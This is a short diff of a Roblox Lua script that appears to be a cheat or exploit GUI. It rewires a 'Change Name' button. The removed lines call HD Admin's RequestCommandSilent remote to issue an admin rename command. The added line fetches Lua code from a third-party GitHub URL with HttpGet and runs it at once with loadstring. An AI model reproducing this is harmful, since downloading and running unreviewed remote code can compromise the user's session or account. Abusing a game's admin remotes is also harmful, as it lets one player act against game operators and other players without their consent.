@@ -204,10 +204,7 @@ end)
 
 local ChangeNameBtn = createButton("ChangeName", "Change Name", 300, 310, 95, 40)
 ChangeNameBtn.MouseButton1Click:Connect(function()
-    local ReplicatedStorage = game:GetService("ReplicatedStorage")
-    local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
-    
-    RequestCommand:InvokeServer(":name me The Lord")
+loadstring(game:HttpGet('https://raw.githubusercontent.com/2spooks1683-source/HDadminName/refs/heads/main/lua.main'))()
 
 end)
 
